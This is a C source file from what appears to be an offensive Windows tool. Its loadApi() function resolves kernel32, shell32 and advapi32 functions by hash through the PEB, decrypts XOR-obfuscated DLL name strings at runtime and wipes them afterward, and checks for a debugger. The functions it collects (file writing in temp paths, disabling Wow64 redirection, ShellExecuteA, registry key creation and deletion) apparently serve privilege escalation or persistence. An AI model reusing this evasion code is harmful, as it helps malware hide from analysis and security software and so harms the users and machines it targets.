#include <windows.h>
#include <winternl.h>
#include <stdio.h>

#include "CalcAPI.h"
#include "LoadAPI.h"
#include "Decryption.h"

BOOL loadApi(API_Call *APICall) {
	Kernel32_API* Kernel32Api = &(APICall->Kernel32Api);
	Shell32_API* Shell32Api = &(APICall->Shell32Api);
	Advapi32_API* Advapi32Api = &(APICall->Advapi32Api);

	char Shell32DllStr[] = "\x09\x1D\x32\x2A\x19\x42\x41\x78\x2D\x39\x0A\x45";
	char Advapi32DllStr[] = "\x13\x27\x20\x00\x38\x08\x5F\x61\x7E\x34\x29\x0B\x78";


	const DWORD hash_kernel32_dll = 0x29cdd463;
	const DWORD hash_LoadLibraryA = 0xe96ce9ef;

	PPEB pPeb = get_peb();
	if (pPeb->BeingDebugged) {
		printf("	[X] Debugger Detected !!!\n");
		//return FALSE;
	}

	LoadLibraryA_F pLoadLibraryA =(LoadLibraryA_F) find_api(pPeb, hash_kernel32_dll, hash_LoadLibraryA);
	if(pLoadLibraryA == NULL)
		return FALSE;

	decryptionRoutine(Shell32DllStr,12,"\x5A\x75\x57\x46\x75\x71\x73\x56\x49\x55\x66\x45");
	decryptionRoutine(Advapi32DllStr,13,"\x52\x43\x56\x61\x48\x61\x6C\x53\x50\x50\x45\x67\x78");


	Kernel32Api->CloseHandleF = (CloseHandle_F)find_api(pPeb,hash_kernel32_dll, 0xfef545);
	Kernel32Api->GetTempPathAF = (GetTempPathA_F)find_api(pPeb,hash_kernel32_dll, 0xb5237431);
	Kernel32Api->GetFileAttributesAF = (GetFileAttributesA_F)find_api(pPeb,hash_kernel32_dll, 0xf5343ae3);
	Kernel32Api->CreateDirectoryAF = (CreateDirectoryA_F)find_api(pPeb,hash_kernel32_dll, 0xc0a3f6f3);
	Kernel32Api->GetTempPathAF = (GetTempPathA_F)find_api(pPeb,hash_kernel32_dll, 0xb5237431);
	Kernel32Api->CreateFileAF = (CreateFileA_F)find_api(pPeb,hash_kernel32_dll, 0xe84b3a8e);
	Kernel32Api->WriteFileF = (WriteFile_F)find_api(pPeb,hash_kernel32_dll, 0xd6bc7fea);
	Kernel32Api->CloseHandleF = (CloseHandle_F)find_api(pPeb,hash_kernel32_dll, 0xfef545);
	Kernel32Api->Wow64DisableWow64FsRedirectionF = (Wow64DisableWow64FsRedirection_F)find_api(pPeb,hash_kernel32_dll, 0x7d3c70a);
	Kernel32Api->Wow64RevertWow64FsRedirectionF = (Wow64RevertWow64FsRedirection_F)find_api(pPeb,hash_kernel32_dll, 0xd6b5ef68);
	Kernel32Api->SleepF = (Sleep_F)find_api(pPeb,hash_kernel32_dll, 0x6d3d9a28);
	if(Kernel32Api->CloseHandleF == NULL ||Kernel32Api->GetTempPathAF == NULL ||Kernel32Api->GetFileAttributesAF == NULL ||Kernel32Api->CreateDirectoryAF == NULL ||Kernel32Api->GetTempPathAF == NULL ||Kernel32Api->CreateFileAF == NULL ||Kernel32Api->WriteFileF == NULL ||Kernel32Api->CloseHandleF == NULL ||Kernel32Api->Wow64DisableWow64FsRedirectionF == NULL ||Kernel32Api->Wow64RevertWow64FsRedirectionF == NULL ||Kernel32Api->SleepF == NULL)
		return FALSE;

	if(pLoadLibraryA(Shell32DllStr) != NULL) {
		const DWORD Shell32Hash = 0x1d89f936;
		memset(Shell32DllStr,0x00,12);
		Shell32Api->ShellExecuteAF = (ShellExecuteA_F)find_api(pPeb,Shell32Hash, 0xda539b7f);
		if(Shell32Api->ShellExecuteAF == NULL)
			return FALSE;
	}else
		return FALSE;

	if(pLoadLibraryA(Advapi32DllStr) != NULL) {
		const DWORD Advapi32Hash = 0x35c841f5;
		memset(Advapi32DllStr,0x00,13);
		Advapi32Api->RegOpenKeyExAF = (RegOpenKeyExA_F)find_api(pPeb,Advapi32Hash, 0xaf60e09c);
		Advapi32Api->RegCreateKeyExAF = (RegCreateKeyExA_F)find_api(pPeb,Advapi32Hash, 0x5f946d90);
		Advapi32Api->RegSetValueExAF = (RegSetValueExA_F)find_api(pPeb,Advapi32Hash, 0xa48d94fc);
		Advapi32Api->RegDeleteTreeAF = (RegDeleteTreeA_F)find_api(pPeb,Advapi32Hash, 0x9e4bd495);
		Advapi32Api->RegCloseKeyF = (RegCloseKey_F)find_api(pPeb,Advapi32Hash, 0xd91f178a);
		if(Advapi32Api->RegOpenKeyExAF == NULL ||Advapi32Api->RegCreateKeyExAF == NULL ||Advapi32Api->RegSetValueExAF == NULL ||Advapi32Api->RegDeleteTreeAF == NULL ||Advapi32Api->RegCloseKeyF == NULL)
			return FALSE;
	}else
		return FALSE;

	return TRUE;
}
